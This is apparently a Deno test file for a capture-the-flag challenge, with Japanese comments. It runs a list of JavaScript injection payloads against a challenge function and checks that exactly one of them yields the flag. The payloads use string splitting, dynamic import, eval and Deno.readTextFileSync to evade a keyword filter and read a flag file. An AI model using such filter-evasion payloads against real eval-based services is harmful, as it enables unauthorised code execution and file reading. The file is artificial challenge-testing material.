import { chall } from "./main.ts";
import { assertEquals } from "https://deno.land/std@0.221.0/assert/mod.ts";

const sleep = (time: number) =>
  new Promise((resolve) => setTimeout(resolve, time));

Deno.test("Flag check test", async () => {
  const payloads = [
    undefined,
    // 関数名取得
    `(async() => {
      const mod = await import("./fl"+"ag.ts");
      let keys = [];
      for(var k in mod){
        keys.push(k);
      }
      return keys.toString();
    })()`,
    `(async() => {
      const mod = await import("./fl"+"ag.ts");
      return Reflect.ownKeys(mod).map(k => k.toString())
    })()`,

    // 関数の実行
    `(async() => {
      return (await import("./fl"+"ag.ts")).getRealFlag_yUC2BwCtXEkg()
    })()`,

    // フラグ取得
    `(async() => {
      return (await import("./fl"+"ag.ts")).getRealFlag_yUC2BwCtXEkg
    })()`,

    // waf確認
    'Object.entries(eval("fl"+"ag"))',

    // ファイル読み込みの失敗確認
    // 注: ngWordsからDenoを削除しないと確認できない
    'Deno.readTextFileSync("./fl"+"ag.ts")',

    // waf確認 2
    'eval("Obj"+"ect.entries(eval(`fl`+`ag`))")',
  ];

  // 雑テスト
  let gotFlag = 0;
  for (const payload of payloads) {
    console.log(`========== ${payload} ==========\n`);
    const result = await chall(payload);
    console.log(result);
    if (result.includes("ctf4b{")) {
      gotFlag++;
    }
    await sleep(1000);
  }
  assertEquals(gotFlag, 1);
});
